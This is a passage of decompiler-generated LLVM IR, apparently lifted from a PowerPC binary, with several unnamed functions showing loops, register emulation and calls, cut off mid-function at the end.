  %v0_1000fdb0 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000fdb0 = add i32 %v0_1000fdb0, -1
  store i32 %v1_1000fdb0, i32* %ctr.global-to-local, align 4
  %v2_1000fdb0 = icmp eq i32 %v1_1000fdb0, 0
  br i1 %v2_1000fdb0, label %dec_label_pc_1000fdb4, label %dec_label_pc_1000fda8.dec_label_pc_1000fd74_crit_edge

dec_label_pc_1000fda8.dec_label_pc_1000fd74_crit_edge: ; preds = %dec_label_pc_1000fda8
  %v0_1000fd78.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000fd74

dec_label_pc_1000fdb4:                            ; preds = %dec_label_pc_1000fda8
  %v3_1000fdb8 = load i32, i32* @global_var_1002b944.784, align 4
  store i32 268500416, i32* @lr, align 4
  %v2_1000fdbc = call i32 @function_10010414(i32 %v3_1000fdb8, i32 ptrtoint (i32* @global_var_10030000.1 to i32))
  %v0_1000fdc0 = load i32, i32* @r1, align 4
  %v1_1000fdc0 = inttoptr i32 %v0_1000fdc0 to i32*
  %v2_1000fdc0 = load i32, i32* %v1_1000fdc0, align 4
  store i32 %v2_1000fdc0, i32* %r11.global-to-local, align 4
  %v1_1000fdc4 = add i32 %v2_1000fdc0, 4
  %v2_1000fdc4 = inttoptr i32 %v1_1000fdc4 to i32*
  %v3_1000fdc4 = load i32, i32* %v2_1000fdc4, align 4
  store i32 %v3_1000fdc4, i32* %r0.global-to-local, align 4
  ret i32 %v2_1000fdbc

; uselistorder directives
  uselistorder i32 %v1_1000fdb0, { 1, 0 }
  uselistorder i8 %stack_var_-56.2, { 2, 0, 3, 1 }
  uselistorder i32 %v1_1000fd00, { 1, 0 }
  uselistorder i32 %v1_1000fcf8, { 1, 0, 2 }
  uselistorder i8 %stack_var_-56.0, { 2, 0, 1, 3 }
  uselistorder i32 %stack_var_-52.0, { 0, 1, 3, 2 }
  uselistorder i32 %v2_1000fcc0, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r8.global-to-local, { 1, 2, 0 }
  uselistorder i32 27, { 3, 4, 1, 2, 0, 5 }
  uselistorder i8 1, { 0, 1, 13, 14, 11, 12, 2, 3, 15, 10, 9, 8, 7, 6, 5, 4, 16, 17 }
  uselistorder label %dec_label_pc_1000fda8, { 1, 0 }
  uselistorder label %dec_label_pc_1000fd24, { 1, 0 }
}

define i32 @function_1000fdd8(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000fdd8:
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-304 = alloca i32, align 4
  %stack_var_-432 = alloca i32, align 4
  %stack_var_-440 = alloca i32, align 4
  store i32 %arg1, i32* %r8.global-to-local, align 4
  %v3_1000fde0 = icmp eq i32 %arg1, 0
  br i1 %v3_1000fde0, label %dec_label_pc_1000ff8c, label %dec_label_pc_1000fe08.lr.ph

dec_label_pc_1000fe08.lr.ph:                      ; preds = %dec_label_pc_1000fdd8
  %v2_1000fdfc = ptrtoint i32* %stack_var_-440 to i32
  store i32 %v2_1000fdfc, i32* %r7.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  store i32 31, i32* %r11.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  %v2_1000fe0842 = add i32 %v2_1000fdfc, 132
  %v3_1000fe0843 = inttoptr i32 %v2_1000fe0842 to i32*
  store i32 0, i32* %v3_1000fe0843, align 4
  %v0_1000fe0c44 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000fe0c45 = add i32 %v0_1000fe0c44, -1
  store i32 %v1_1000fe0c45, i32* %r11.global-to-local, align 4
  %v1_1000fe1046 = mul i32 %v1_1000fe0c45, 4
  %v1_1000fe1447 = load i32, i32* %r7.global-to-local, align 4
  %v2_1000fe1448 = add i32 %v1_1000fe1447, %v1_1000fe1046
  %v0_1000fe1849 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000fe1850 = add i32 %v0_1000fe1849, -1
  store i32 %v1_1000fe1850, i32* %ctr.global-to-local, align 4
  %v2_1000fe1851 = icmp eq i32 %v1_1000fe1850, 0
  br i1 %v2_1000fe1851, label %dec_label_pc_1000fe1c, label %dec_label_pc_1000fe08.dec_label_pc_1000fe08_crit_edge

dec_label_pc_1000fe08.dec_label_pc_1000fe08_crit_edge: ; preds = %dec_label_pc_1000fe08.lr.ph, %dec_label_pc_1000fe08.dec_label_pc_1000fe08_crit_edge
  %v2_1000fe1452 = phi i32 [ %v2_1000fe14, %dec_label_pc_1000fe08.dec_label_pc_1000fe08_crit_edge ], [ %v2_1000fe1448, %dec_label_pc_1000fe08.lr.ph ]
  %v0_1000fe08.pre = load i32, i32* %r10.global-to-local, align 4
  %v2_1000fe08 = add i32 %v2_1000fe1452, 8
  %v3_1000fe08 = inttoptr i32 %v2_1000fe08 to i32*
  store i32 %v0_1000fe08.pre, i32* %v3_1000fe08, align 4
  %v0_1000fe0c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000fe0c = add i32 %v0_1000fe0c, -1
  store i32 %v1_1000fe0c, i32* %r11.global-to-local, align 4
  %v1_1000fe10 = mul i32 %v1_1000fe0c, 4
  %v1_1000fe14 = load i32, i32* %r7.global-to-local, align 4
  %v2_1000fe14 = add i32 %v1_1000fe14, %v1_1000fe10
  %v0_1000fe18 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000fe18 = add i32 %v0_1000fe18, -1
  store i32 %v1_1000fe18, i32* %ctr.global-to-local, align 4
  %v2_1000fe18 = icmp eq i32 %v1_1000fe18, 0
  br i1 %v2_1000fe18, label %dec_label_pc_1000fe1c, label %dec_label_pc_1000fe08.dec_label_pc_1000fe08_crit_edge

dec_label_pc_1000fe1c:                            ; preds = %dec_label_pc_1000fe08.dec_label_pc_1000fe08_crit_edge, %dec_label_pc_1000fe08.lr.ph
  %v0_1000fe30.pre = load i32, i32* %r8.global-to-local, align 4
  %v2_1000fe1c = ptrtoint i32* %stack_var_-432 to i32
  store i32 %v2_1000fe1c, i32* @r3, align 4
  store i32 17, i32* @r4, align 4
  store i32 %v0_1000fe30.pre, i32* %stack_var_-440, align 4
  %v0_1000fe34 = call i32 @function_1000ef10()
  store i32 %v0_1000fe34, i32* %r3.global-to-local, align 4
  %v1_1000fe38 = icmp slt i32 %v0_1000fe34, 0
  br i1 %v1_1000fe38, label %dec_label_pc_1000ff94, label %dec_label_pc_1000fe40

dec_label_pc_1000fe40:                            ; preds = %dec_label_pc_1000fe1c
  %v2_1000fe40 = ptrtoint i32* %stack_var_-304 to i32
  store i32 %v2_1000fe40, i32* @r31, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 268500564, i32* @lr, align 4
  %v3_1000fe50 = call i32 @function_1000c714(i32 0, i32 %v2_1000fe1c, i32 %v2_1000fe40)
  store i32 %v3_1000fe50, i32* %r3.global-to-local, align 4
  %v3_1000fe54 = icmp eq i32 %v3_1000fe50, 0
  br i1 %v3_1000fe54, label %dec_label_pc_1000fe5c, label %dec_label_pc_1000ff94

dec_label_pc_1000fe5c:                            ; preds = %dec_label_pc_1000fe40
  store i32 %v2_1000fe40, i32* %r3.global-to-local, align 4
  %v2_1000fe64 = call i32 @function_1000eee8(i32 %v2_1000fe40, i32 17)
  store i32 %v2_1000fe64, i32* %r3.global-to-local, align 4
  %v3_1000fe68 = icmp eq i32 %v2_1000fe64, 0
  br i1 %v3_1000fe68, label %dec_label_pc_1000fe88.lr.ph, label %dec_label_pc_1000ff54

dec_label_pc_1000fe88.lr.ph:                      ; preds = %dec_label_pc_1000fe5c
  store i32 %v2_1000fdfc, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  store i32 31, i32* %r11.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  store i32 0, i32* %v3_1000fe0843, align 4
  %v0_1000fe8c33 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000fe8c34 = add i32 %v0_1000fe8c33, -1
  store i32 %v1_1000fe8c34, i32* %r11.global-to-local, align 4
  %v1_1000fe9035 = mul i32 %v1_1000fe8c34, 4
  %v1_1000fe9436 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000fe9437 = add i32 %v1_1000fe9436, %v1_1000fe9035
  %v0_1000fe9838 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000fe9839 = add i32 %v0_1000fe9838, -1
  store i32 %v1_1000fe9839, i32* %ctr.global-to-local, align 4
  %v2_1000fe9840 = icmp eq i32 %v1_1000fe9839, 0
  br i1 %v2_1000fe9840, label %dec_label_pc_1000fe9c, label %dec_label_pc_1000fe88.dec_label_pc_1000fe88_crit_edge

dec_label_pc_1000fe88.dec_label_pc_1000fe88_crit_edge: ; preds = %dec_label_pc_1000fe88.lr.ph, %dec_label_pc_1000fe88.dec_label_pc_1000fe88_crit_edge
  %v2_1000fe9441 = phi i32 [ %v2_1000fe94, %dec_label_pc_1000fe88.dec_label_pc_1000fe88_crit_edge ], [ %v2_1000fe9437, %dec_label_pc_1000fe88.lr.ph ]
  %v0_1000fe88.pre = load i32, i32* %r10.global-to-local, align 4
  %v2_1000fe88 = add i32 %v2_1000fe9441, 8
  %v3_1000fe88 = inttoptr i32 %v2_1000fe88 to i32*
  store i32 %v0_1000fe88.pre, i32* %v3_1000fe88, align 4
  %v0_1000fe8c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000fe8c = add i32 %v0_1000fe8c, -1
  store i32 %v1_1000fe8c, i32* %r11.global-to-local, align 4
  %v1_1000fe90 = mul i32 %v1_1000fe8c, 4
  %v1_1000fe94 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000fe94 = add i32 %v1_1000fe94, %v1_1000fe90
  %v0_1000fe98 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000fe98 = add i32 %v0_1000fe98, -1
  store i32 %v1_1000fe98, i32* %ctr.global-to-local, align 4
  %v2_1000fe98 = icmp eq i32 %v1_1000fe98, 0
  br i1 %v2_1000fe98, label %dec_label_pc_1000fe9c, label %dec_label_pc_1000fe88.dec_label_pc_1000fe88_crit_edge

dec_label_pc_1000fe9c:                            ; preds = %dec_label_pc_1000fe88.dec_label_pc_1000fe88_crit_edge, %dec_label_pc_1000fe88.lr.ph
  store i32 %v2_1000fe1c, i32* @r3, align 4
  store i32 17, i32* @r4, align 4
  %v0_1000fea4 = call i32 @function_1000ef10()
  store i32 %v0_1000fea4, i32* %r3.global-to-local, align 4
  %v1_1000fea8 = icmp slt i32 %v0_1000fea4, 0
  br i1 %v1_1000fea8, label %dec_label_pc_1000ff94, label %dec_label_pc_1000feb0

dec_label_pc_1000feb0:                            ; preds = %dec_label_pc_1000fe9c
  store i32 17, i32* %r3.global-to-local, align 4
  %v2_1000feb8 = ptrtoint i32* %stack_var_-176 to i32
  store i32 268500672, i32* @lr, align 4
  %v4_1000febc = call i32 @function_100122a8(i32 17, i32* null, i32 %v2_1000feb8)
  store i32 %v4_1000febc, i32* %r3.global-to-local, align 4
  %tmp30 = icmp sgt i32 %v4_1000febc, -1
  br i1 %tmp30, label %dec_label_pc_1000fef0, label %dec_label_pc_1000fec8

dec_label_pc_1000fec8:                            ; preds = %dec_label_pc_1000feb0
  %v0_1000fec8 = call i32 @function_1000c85c()
  store i32 %v0_1000fec8, i32* %r3.global-to-local, align 4
  %v1_1000fed0 = inttoptr i32 %v0_1000fec8 to i32*
  %v2_1000fed0 = load i32, i32* %v1_1000fed0, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268500708, i32* @lr, align 4
  %v3_1000fee0 = call i32 @function_1000c714(i32 2, i32 %v2_1000fe40, i32 0)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v2_1000fee8 = inttoptr i32 %v0_1000fec8 to i32*
  store i32 %v2_1000fed0, i32* %v2_1000fee8, align 4
  %v0_1000ffa8.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000ff98

dec_label_pc_1000fef0:                            ; preds = %dec_label_pc_1000feb0
  %v3_1000fef0 = load i32, i32* %stack_var_-176, align 4
  %v3_1000fefc = icmp eq i32 %v3_1000fef0, 1
  br i1 %v3_1000fefc, label %dec_label_pc_1000ff04, label %dec_label_pc_1000ff38

dec_label_pc_1000ff04:                            ; preds = %dec_label_pc_1000fef0
  store i32 %v2_1000fdfc, i32* %r3.global-to-local, align 4
  store i32 268500752, i32* @lr, align 4
  %v2_1000ff0c = call i32 @function_10010534(i32 %v2_1000fdfc, i32 %v2_1000fdfc)
  store i32 %v2_1000ff0c, i32* %r3.global-to-local, align 4
  store i32 %v2_1000ff0c, i32* @r31, align 4
  %v0_1000ff14 = call i32 @function_1000c85c()
  store i32 %v0_1000ff14, i32* %r3.global-to-local, align 4
  %v1_1000ff18 = inttoptr i32 %v0_1000ff14 to i32*
  %v2_1000ff18 = load i32, i32* %v1_1000ff18, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268500784, i32* @lr, align 4
  %v3_1000ff2c = call i32 @function_1000c714(i32 2, i32 %v2_1000fe40, i32 0)
  store i32 %v3_1000ff2c, i32* %r3.global-to-local, align 4
  %v2_1000ff30 = inttoptr i32 %v0_1000ff14 to i32*
  store i32 %v2_1000ff18, i32* %v2_1000ff30, align 4
  %v0_1000ff60.pr = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000ff60

dec_label_pc_1000ff38:                            ; preds = %dec_label_pc_1000fef0
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268500808, i32* @lr, align 4
  %v3_1000ff44 = call i32 @function_1000c714(i32 2, i32 %v2_1000fe40, i32 0)
  br label %dec_label_pc_1000ff54

dec_label_pc_1000ff54:                            ; preds = %dec_label_pc_1000fe5c, %dec_label_pc_1000ff38
  store i32 %v2_1000fdfc, i32* %r3.global-to-local, align 4
  store i32 268500828, i32* @lr, align 4
  %v2_1000ff58 = call i32 @function_10010534(i32 %v2_1000fdfc, i32 %v2_1000fdfc)
  store i32 %v2_1000ff58, i32* %r3.global-to-local, align 4
  store i32 %v2_1000ff58, i32* @r31, align 4
  br label %dec_label_pc_1000ff60

dec_label_pc_1000ff60:                            ; preds = %dec_label_pc_1000ff04, %dec_label_pc_1000ff54
  %v0_1000ff60 = phi i32 [ %v0_1000ff60.pr, %dec_label_pc_1000ff04 ], [ %v2_1000ff58, %dec_label_pc_1000ff54 ]
  %v3_1000ff60 = icmp eq i32 %v0_1000ff60, 0
  br i1 %v3_1000ff60, label %dec_label_pc_1000ff8c, label %dec_label_pc_1000ff68

dec_label_pc_1000ff68:                            ; preds = %dec_label_pc_1000ff60
  %v3_1000ff78 = load i32, i32* %stack_var_-440, align 4
  %v0_1000ff7c = call i32 @__asm_mfcr()
  store i32 %v0_1000ff7c, i32* %r3.global-to-local, align 4
  %v1_1000ff80 = call i32 @__asm_rlwinm(i32 %v0_1000ff7c, i32 30, i32 31, i32 31)
  %v2_1000ff84 = add i32 %v3_1000ff78, %v1_1000ff80
  store i32 %v2_1000ff84, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000ff98

dec_label_pc_1000ff8c:                            ; preds = %dec_label_pc_1000ff60, %dec_label_pc_1000fdd8
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000ff98

dec_label_pc_1000ff94:                            ; preds = %dec_label_pc_1000fe40, %dec_label_pc_1000fe9c, %dec_label_pc_1000fe1c
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000ff98

dec_label_pc_1000ff98:                            ; preds = %dec_label_pc_1000ff8c, %dec_label_pc_1000ff68, %dec_label_pc_1000fec8, %dec_label_pc_1000ff94
  %v0_1000ffa8 = phi i32 [ 0, %dec_label_pc_1000ff8c ], [ %v2_1000ff84, %dec_label_pc_1000ff68 ], [ %v0_1000ffa8.pre, %dec_label_pc_1000fec8 ], [ -1, %dec_label_pc_1000ff94 ]
  ret i32 %v0_1000ffa8

; uselistorder directives
  uselistorder i32 %v1_1000fe98, { 1, 0 }
  uselistorder i32 %v2_1000fe40, { 1, 2, 0, 4, 3, 5, 6 }
  uselistorder i32 %v1_1000fe18, { 1, 0 }
  uselistorder i32 %v2_1000fdfc, { 2, 1, 3, 6, 5, 4, 7, 0, 8 }
  uselistorder i32* %r3.global-to-local, { 3, 5, 4, 1, 6, 2, 7, 8, 9, 10, 11, 12, 14, 15, 13, 16, 17, 18, 19, 20, 21, 22, 23, 24, 0 }
  uselistorder i32* %r11.global-to-local, { 0, 2, 3, 6, 7, 1, 4, 5, 8, 9 }
  uselistorder i32* %ctr.global-to-local, { 0, 2, 3, 6, 7, 1, 4, 5, 8, 9 }
  uselistorder i32 (i32, i32)* @function_10010534, { 1, 0 }
  uselistorder i32 (i32, i32)* @function_1000eee8, { 1, 0 }
  uselistorder label %dec_label_pc_1000ff98, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000ff94, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000ff60, { 1, 0 }
  uselistorder label %dec_label_pc_1000ff54, { 1, 0 }
  uselistorder label %dec_label_pc_1000fe88.dec_label_pc_1000fe88_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1000fe08.dec_label_pc_1000fe08_crit_edge, { 1, 0 }
}

define i32 @function_1000ffac(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000fffc:
  %v3_10010000 = load i32, i32* @global_var_1002b94c.786, align 4
  %v3_10010004 = icmp eq i32 %v3_10010000, 0
  br i1 %v3_10010004, label %dec_label_pc_10010014, label %dec_label_pc_1001000c

dec_label_pc_1001000c:                            ; preds = %dec_label_pc_1000fffc
  %v2_10010010 = load i32, i32* @r4, align 4
  %v3_10010010 = call i32 @unknown_0(i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32 %v2_10010010)
  store i32 %v3_10010010, i32* @r3, align 4
  br label %dec_label_pc_10010014

dec_label_pc_10010014:                            ; preds = %dec_label_pc_1000fffc, %dec_label_pc_1001000c
  %v3_10010018 = load i32, i32* @global_var_1002b950.787, align 4
  %v3_1001001c = icmp eq i32 %v3_10010018, 0
  br i1 %v3_1001001c, label %dec_label_pc_10010014.dec_label_pc_1001002c_crit_edge, label %dec_label_pc_10010024

dec_label_pc_10010014.dec_label_pc_1001002c_crit_edge: ; preds = %dec_label_pc_10010014
  %v0_1001003c.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_1001002c

dec_label_pc_10010024:                            ; preds = %dec_label_pc_10010014
  %v2_10010028 = load i32, i32* @r4, align 4
  %v3_10010028 = call i32 @unknown_0(i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32 %v2_10010028)
  br label %dec_label_pc_1001002c

dec_label_pc_1001002c:                            ; preds = %dec_label_pc_10010014.dec_label_pc_1001002c_crit_edge, %dec_label_pc_10010024
  %v0_1001003c = phi i32 [ %v0_1001003c.pre, %dec_label_pc_10010014.dec_label_pc_1001002c_crit_edge ], [ %v3_10010028, %dec_label_pc_10010024 ]
  ret i32 %v0_1001003c

; uselistorder directives
  uselistorder i32 (i32, i32)* @unknown_0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1001002c, { 1, 0 }
  uselistorder label %dec_label_pc_10010014, { 1, 0 }
}

define i32 @function_10010040() local_unnamed_addr {
dec_label_pc_10010040:
  ret i32 0
}

define i32 @function_10010048() local_unnamed_addr {
dec_label_pc_10010048:
  %v0_10010048 = load i32, i32* @r3, align 4
  ret i32 %v0_10010048
}

define i32 @function_1001004c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1001004c:
  store i32 %arg2, i32* @r30, align 4
  store i32 %arg1, i32* @r31, align 4
  store i32 268501104, i32* @lr, align 4
  %v2_1001006c = call i32 @function_1000c140(i32 1, i32 1)
  %v3_10010070 = icmp eq i32 %v2_1001006c, -1
  br i1 %v3_10010070, label %dec_label_pc_10010078, label %dec_label_pc_10010098

dec_label_pc_10010078:                            ; preds = %dec_label_pc_1001004c
  %v0_1001007c = load i32, i32* @r30, align 4
  store i32 268501132, i32* @lr, align 4
  %v3_10010088 = call i32 @function_1000c524(i32 ptrtoint ([10 x i8]* @global_var_1001a15c.788 to i32), i32 %v0_1001007c)
  %v1_1001008c = load i32, i32* @r31, align 4
  %v4_1001008c = icmp eq i32 %v3_10010088, %v1_1001008c
  br i1 %v4_1001008c, label %dec_label_pc_10010098, label %dec_label_pc_10010094

dec_label_pc_10010094:                            ; preds = %dec_label_pc_10010078
  %v1_10010094 = call i32 @function_1001236c(i32 %v3_10010088)
  br label %dec_label_pc_10010098

dec_label_pc_10010098:                            ; preds = %dec_label_pc_1001004c, %dec_label_pc_10010078, %dec_label_pc_10010094
  %v0_100100a8 = phi i32 [ %v2_1001006c, %dec_label_pc_1001004c ], [ %v3_10010088, %dec_label_pc_10010078 ], [ %v1_10010094, %dec_label_pc_10010094 ]
  ret i32 %v0_100100a8

; uselistorder directives
  uselistorder label %dec_label_pc_10010098, { 2, 1, 0 }
}

define i32 @function_100100ac(i32 %arg1) local_unnamed_addr {
dec_label_pc_100100ac:
  %v3_100100c8 = load i32, i32* @global_var_1002b954.789, align 4
  %v3_100100d0 = icmp eq i32 %v3_100100c8, 0
  br i1 %v3_100100d0, label %dec_label_pc_100100f4, label %dec_label_pc_100100ac.dec_label_pc_10010118_crit_edge

dec_label_pc_100100ac.dec_label_pc_10010118_crit_edge: ; preds = %dec_label_pc_100100ac
  %v0_10010128.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_10010118

dec_label_pc_100100f4:                            ; preds = %dec_label_pc_100100ac
  store i32 1, i32* @global_var_1002b954.789, align 4
  store i32 4096, i32* @global_var_1002b948.762, align 4
  %v1_10010114 = call i32 @function_1000c9c0(i32 268487104)
  br label %dec_label_pc_10010118

dec_label_pc_10010118:                            ; preds = %dec_label_pc_100100ac.dec_label_pc_10010118_crit_edge, %dec_label_pc_100100f4
  %v0_10010128 = phi i32 [ %v0_10010128.pre, %dec_label_pc_100100ac.dec_label_pc_10010118_crit_edge ], [ %v1_10010114, %dec_label_pc_100100f4 ]
  ret i32 %v0_10010128

; uselistorder directives
  uselistorder label %dec_label_pc_10010118, { 1, 0 }
}

define i32 @function_1001012c(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_1001012c:
  %r29.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  %tmp25 = call i32 @__decompiler_undefined_function_0()
  %tmp26 = call i32 @__decompiler_undefined_function_0()
  %tmp27 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-168 = alloca i32, align 4
  %v1_1001013c = mul i32 %arg2, 4
  store i32 %tmp, i32* @r30, align 4
  %v2_10010148 = add i32 %tmp, %v1_1001013c
  %v0_1001014c = load i32, i32* @r9, align 4
  store i32 %v0_1001014c, i32* @global_var_1002b940.790, align 4
  %v1_10010150 = add i32 %v2_10010148, 4
  store i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32* %r29.global-to-local, align 4
  store i32 %v1_10010150, i32* @global_var_1002b944.784, align 4
  store i32 %arg6, i32* @global_var_1002b950.787, align 4
  store i32 %arg2, i32* @r26, align 4
  store i32 %arg1, i32* @r25, align 4
  store i32 %arg4, i32* @r28, align 4
  store i32 %arg5, i32* @r27, align 4
  %v2_10010174 = load i32, i32* %arg3, align 4
  %v4_10010178 = icmp eq i32 %v1_10010150, %v2_10010174
  br i1 %v4_10010178, label %dec_label_pc_10010180, label %dec_label_pc_10010184

dec_label_pc_10010180:                            ; preds = %dec_label_pc_1001012c
  store i32 %v2_10010148, i32* @global_var_1002b944.784, align 4
  br label %dec_label_pc_10010184

dec_label_pc_10010184:                            ; preds = %dec_label_pc_1001012c, %dec_label_pc_10010180
  %v2_10010184 = ptrtoint i32* %stack_var_-168 to i32
  store i32 268501396, i32* @lr, align 4
  %v3_10010190 = call i32 @function_1000dd4c(i32 %v2_10010184, i32 0, i32 120)
  %storemerge.pre = load i32, i32* @global_var_1002b944.784, align 4
  br label %dec_label_pc_100101a0

dec_label_pc_100101a0:                            ; preds = %dec_label_pc_100101a0, %dec_label_pc_10010184
  %storemerge = phi i32 [ %storemerge.pre, %dec_label_pc_10010184 ], [ %v1_100101a4, %dec_label_pc_100101a0 ]
  %v1_100101a0 = inttoptr i32 %storemerge to i32*
  %v2_100101a0 = load i32, i32* %v1_100101a0, align 4
  %v1_100101a4 = add i32 %storemerge, 4
  %v3_100101a8 = icmp eq i32 %v2_100101a0, 0
  br i1 %v3_100101a8, label %dec_label_pc_100101b0, label %dec_label_pc_100101a0

dec_label_pc_100101b0:                            ; preds = %dec_label_pc_100101a0
  store i32 %v1_100101a4, i32* %r29.global-to-local, align 4
  %v1_100101dc12 = inttoptr i32 %v1_100101a4 to i32*
  %v2_100101dc13 = load i32, i32* %v1_100101dc12, align 4
  %v3_100101e016 = icmp eq i32 %v2_100101dc13, 0
  br i1 %v3_100101e016, label %dec_label_pc_100101e8, label %dec_label_pc_100101b8

dec_label_pc_100101b8:                            ; preds = %dec_label_pc_100101b0, %dec_label_pc_100101d8
  %v0_100101cc = phi i32 [ %v1_100101d8, %dec_label_pc_100101d8 ], [ %v1_100101a4, %dec_label_pc_100101b0 ]
  %v0_100101c0 = phi i32 [ %v2_100101dc, %dec_label_pc_100101d8 ], [ %v2_100101dc13, %dec_label_pc_100101b0 ]
  %v2_100101b8 = icmp ugt i32 %v0_100101c0, 14
  br i1 %v2_100101b8, label %dec_label_pc_100101d8, label %dec_label_pc_100101c0

dec_label_pc_100101c0:                            ; preds = %dec_label_pc_100101b8
  %v1_100101c0 = mul i32 %v0_100101c0, 8
  %v2_100101c8 = add i32 %v1_100101c0, %v2_10010184
  store i32 %v2_100101c8, i32* @r3, align 4
  store i32 %v0_100101cc, i32* @r4, align 4
  store i32 8, i32* @r5, align 4
  store i32 268501464, i32* @lr, align 4
  %v0_100101d4 = call i32 @function_1000dcb0()
  %v0_100101d8.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_100101d8

dec_label_pc_100101d8:                            ; preds = %dec_label_pc_100101b8, %dec_label_pc_100101c0
  %v0_100101d8 = phi i32 [ %v0_100101cc, %dec_label_pc_100101b8 ], [ %v0_100101d8.pre, %dec_label_pc_100101c0 ]
  %v1_100101d8 = add i32 %v0_100101d8, 8
  store i32 %v1_100101d8, i32* %r29.global-to-local, align 4
  %v1_100101dc = inttoptr i32 %v1_100101d8 to i32*
  %v2_100101dc = load i32, i32* %v1_100101dc, align 4
  %v3_100101e0 = icmp eq i32 %v2_100101dc, 0
  br i1 %v3_100101e0, label %dec_label_pc_100101e8, label %dec_label_pc_100101b8

dec_label_pc_100101e8:                            ; preds = %dec_label_pc_100101d8, %dec_label_pc_100101b0
  %v1_100101ec = call i32 @function_100124bc(i32 %v2_10010184)
  store i32 %v1_100101ec, i32* @r3, align 4
  store i32 268501492, i32* @lr, align 4
  %v1_100101f0 = call i32 @function_100100ac(i32 %v1_100101ec)
  %v3_100101f8 = icmp eq i32 %tmp27, 0
  br i1 %v3_100101f8, label %dec_label_pc_10010200, label %dec_label_pc_10010204

dec_label_pc_10010200:                            ; preds = %dec_label_pc_100101e8
  br label %dec_label_pc_10010204

dec_label_pc_10010204:                            ; preds = %dec_label_pc_100101e8, %dec_label_pc_10010200
  %v0_10010208 = phi i32 [ %tmp27, %dec_label_pc_100101e8 ], [ 4096, %dec_label_pc_10010200 ]
  store i32 %v0_10010208, i32* @global_var_1002b948.762, align 4
  %v3_10010210 = icmp eq i32 %tmp26, -1
  br i1 %v3_10010210, label %dec_label_pc_10010218, label %dec_label_pc_1001024c

dec_label_pc_10010218:                            ; preds = %dec_label_pc_10010204
  store i32 268501532, i32* @lr, align 4
  %v1_10010218 = call i32 @function_100104ec(i32 ptrtoint (i32* @global_var_10030000.1 to i32))
  store i32 %v1_10010218, i32* %r29.global-to-local, align 4
  store i32 268501540, i32* @lr, align 4
  %v0_10010220 = call i32 @function_1000c404()
  %v4_10010224 = icmp eq i32 %v1_10010218, %v0_10010220
  br i1 %v4_10010224, label %dec_label_pc_1001022c, label %dec_label_pc_10010268

dec_label_pc_1001022c:                            ; preds = %dec_label_pc_10010218
  store i32 268501552, i32* @lr, align 4
  %v1_1001022c = call i32 @function_100104a4(i32 %v0_10010220)
  store i32 %v1_1001022c, i32* %r29.global-to-local, align 4
  store i32 268501560, i32* @lr, align 4
  %v0_10010234 = call i32 @function_1001045c()
  %v4_10010238 = icmp eq i32 %v1_1001022c, %v0_10010234
  br i1 %v4_10010238, label %dec_label_pc_10010240.thread, label %dec_label_pc_10010268

dec_label_pc_10010240.thread:                     ; preds = %dec_label_pc_1001022c
  br label %dec_label_pc_10010298

dec_label_pc_1001024c:                            ; preds = %dec_label_pc_10010204
  %v4_10010250 = icmp eq i32 %tmp26, %tmp25
  br i1 %v4_10010250, label %dec_label_pc_10010258, label %dec_label_pc_10010268

dec_label_pc_10010258:                            ; preds = %dec_label_pc_1001024c
  br label %dec_label_pc_10010268

dec_label_pc_10010268:                            ; preds = %dec_label_pc_10010258, %dec_label_pc_1001024c, %dec_label_pc_1001022c, %dec_label_pc_10010218
  store i32 268501624, i32* @lr, align 4
  %v2_10010274 = call i32 @function_1001004c(i32 0, i32 32768)
  store i32 268501640, i32* @lr, align 4
  %v2_10010284 = call i32 @function_1001004c(i32 1, i32 32770)
  store i32 268501656, i32* @lr, align 4
  %v2_10010294 = call i32 @function_1001004c(i32 2, i32 32770)
